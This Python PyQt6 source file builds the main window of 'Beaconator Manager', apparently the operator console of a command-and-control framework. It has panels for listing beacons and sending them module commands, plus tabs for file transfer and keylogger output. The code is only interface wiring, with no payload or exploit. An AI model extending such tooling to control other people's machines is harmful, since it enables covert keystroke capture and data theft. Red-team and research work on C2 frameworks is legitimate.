import sys
from pathlib import Path
from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QApplication, QSplitter, QStackedWidget, QStackedLayout, QTabWidget)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont, QIcon, QFontDatabase

from config import ConfigManager
from services import ServerManager
from utils import DocumentationManager
from workers import BeaconUpdateWorker
from .components import (BeaconTableWidget, CommandWidget, NavigationMenu, 
                        FileTransferWidget, SettingsPage, DocumentationPanel, BeaconSettingsWidget)
from .widgets import LogWidget, OutputDisplay, KeyLoggerDisplay
import utils

class MainWindow(QMainWindow):
    def __init__(self, server_manager: ServerManager):
        super().__init__()
        self.server_manager = server_manager
        self.beacon_repository = server_manager.beacon_repository
        self.command_processor = server_manager.command_processor
        self.file_transfer_service = server_manager.file_transfer_service
        self.module_handler = server_manager.module_handler
        self.config_manager = ConfigManager()
        self.beacon_update_worker = None
        self.setup_ui()
        self.start_background_workers()

    def setup_ui(self):
        # Set application-wide font using stored settings
        app = QApplication.instance()
        
        # Try to load fonts, but don't fail if they don't exist
        try:
            font_1 = QFontDatabase.addApplicationFont("resources/Montserrat-Regular.ttf")
            mont_families = QFontDatabase.applicationFontFamilies(font_1)
        except:
            mont_families = []

        main_font = QFont()
        if mont_families:
            main_font.setFamilies(mont_families)
        main_font.setPointSize(self.config_manager.get_font_size())
        main_font.setHintingPreference(QFont.HintingPreference.PreferNoHinting)
        app.setFont(main_font)

        self.setWindowTitle("Beaconator Manager")
        self.setMinimumSize(1400, 850)
        
        # Try to set icon, but don't fail if it doesn't exist
        try:
            self.setWindowIcon(QIcon(str(Path("resources") / "icon.ico")))
        except:
            pass

        # Create main widget and layout
        main_widget = QWidget()
        main_layout = QHBoxLayout()
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Add navigation menu
        self.nav_menu = NavigationMenu()
        self.nav_menu.nav_changed.connect(self.on_nav_changed)
        self.nav_menu.doc_panel_toggled.connect(self.toggle_documentation)
        main_layout.addWidget(self.nav_menu)

        # Create a container widget for content and documentation panel
        content_container = QWidget()
        container_layout = QStackedLayout()
        container_layout.setStackingMode(QStackedLayout.StackingMode.StackAll)
        container_layout.setContentsMargins(0, 0, 0, 0)

        # Create stack widget for main content
        self.content_stack = QStackedWidget()
        container_layout.addWidget(self.content_stack)

        # Create documentation manager and panel
        self.doc_manager = DocumentationManager()
        self.doc_panel = DocumentationPanel(self.doc_manager)
        self.doc_panel.hide()
        self.doc_panel.set_content("Introduction")
        container_layout.addWidget(self.doc_panel)

        # Set layout for container
        content_container.setLayout(container_layout)
        main_layout.addWidget(content_container)

        # Create content pages
        self.setup_beacons_page()
        self.setup_settings_page()

        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)

    def setup_beacons_page(self):
        """Create the beacons page with proper 2x2 grid layout"""
        beacons_widget = QWidget()
        main_layout = QVBoxLayout()  
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)
        
        # Create main horizontal splitter for better size control
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        main_splitter.setChildrenCollapsible(False)  # Prevent panels from collapsing completely
        
        # Create left side with the beacon table and log widget
        left_widget = QWidget()
        left_widget.setMinimumWidth(600)  # Ensure minimum width for table column
        left_widget.setMaximumWidth(600)  # Prevent expansion beyond this width
        left_layout = QVBoxLayout()
        left_layout.setContentsMargins(0, 0, 0, 0)
        
        self.beacon_table = BeaconTableWidget()
        self.beacon_table.beacon_selected.connect(self.on_beacon_selected)
        
        # Add vertical splitter between table and log
        left_splitter = QSplitter(Qt.Orientation.Vertical)
        left_splitter.addWidget(self.beacon_table)
        
        # Create log widget
        self.log_widget = LogWidget()
        left_splitter.addWidget(self.log_widget)
        left_splitter.setSizes([300, 300])  # Set initial sizes for vertical splitter
        left_splitter.setStretchFactor(0, 1)  # Table gets more space
        left_splitter.setStretchFactor(1, 1)  # Log gets less space
        
        left_layout.addWidget(left_splitter)
        left_widget.setLayout(left_layout)
        
        # Create right panel with tabs
        right_panel = QTabWidget()
        right_panel.setMinimumWidth(600)  # Ensure minimum width for command column
        
        # Create and add tab widgets
        self.command_widget = CommandWidget(self.beacon_repository, self.doc_panel)
        right_panel.addTab(self.command_widget, "Modules")
        
        self.file_transfer_widget = FileTransferWidget(self.beacon_repository)
        right_panel.addTab(self.file_transfer_widget, "File Transfer")

        self.keylogger_display = KeyLoggerDisplay(self.beacon_repository)
        right_panel.addTab(self.keylogger_display, "KeyLogger")

        self.beacon_settings_widget = BeaconSettingsWidget(self.beacon_repository)
        self.beacon_settings_widget.schema_applied.connect(self.command_widget.on_schema_applied)
        right_panel.addTab(self.beacon_settings_widget, "Beacon Settings")
        
        # Add widgets to main splitter
        main_splitter.addWidget(left_widget)
        main_splitter.addWidget(right_panel)
        
        # Set initial sizes for main splitter (left:right ratio)
        main_splitter.setSizes([600, 600])  # Initial sizes
        main_splitter.setStretchFactor(0, 0)  # Left panel fixed width
        main_splitter.setStretchFactor(1, 1)  # Right panel gets all stretch
        
        # Create content widget and set its layout
        content_widget = QWidget()
        content_layout = QVBoxLayout()
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.addWidget(main_splitter)
        content_widget.setLayout(content_layout)
        
        # Add content widget to main layout
        main_layout.addWidget(content_widget)
        
        beacons_widget.setLayout(main_layout)
        self.content_stack.addWidget(beacons_widget)

    def setup_settings_page(self):
        """Create the settings page"""
        self.settings_page = SettingsPage(self.config_manager, self.server_manager)
        self.content_stack.addWidget(self.settings_page)


    def start_background_workers(self):
        """Start background workers for updating beacon status"""
        # Start beacon update worker
        self.beacon_update_worker = BeaconUpdateWorker(self.beacon_repository)
        self.beacon_update_worker.beacon_updated.connect(self.beacon_table.update_beacons)
        self.beacon_update_worker.start()
        
        # Connect logger to log widget
        if utils.logger:
            utils.logger.new_log.connect(self.log_widget.append_log)

    def on_nav_changed(self, page_id: str):
        """Handle navigation menu changes"""
        self.nav_menu.set_current_page(page_id)
        
        if page_id == "beacons":
            self.content_stack.setCurrentIndex(0)
        elif page_id == "settings":
            self.content_stack.setCurrentIndex(1)

    def toggle_documentation(self, show: bool):
        """Toggle the documentation panel"""
        if show:
            self.doc_panel.show_panel()
        else:
            self.doc_panel.hide_panel()

    def on_beacon_selected(self, beacon_id: str):
        """Handle beacon selection"""
        # Update all widgets that need to know about the selected beacon
        self.command_widget.set_beacon(beacon_id)
        self.file_transfer_widget.set_beacon(beacon_id)
        self.keylogger_display.set_beacon(beacon_id)
        self.beacon_settings_widget.set_beacon(beacon_id)

    def on_command_sent(self, beacon_id: str, command: str):
        """Handle command being sent to beacon"""
        if utils.logger:
            utils.logger.log_message(f"Command sent to {beacon_id}: {command}")

    def closeEvent(self, event):
        """Handle window close event"""
        # Stop background workers
        if self.beacon_update_worker:
            self.beacon_update_worker.stop()
        
        # Cleanup widgets
        if hasattr(self, 'keylogger_display'):
            self.keylogger_display.cleanup()
        
        # Accept the close event
        event.accept()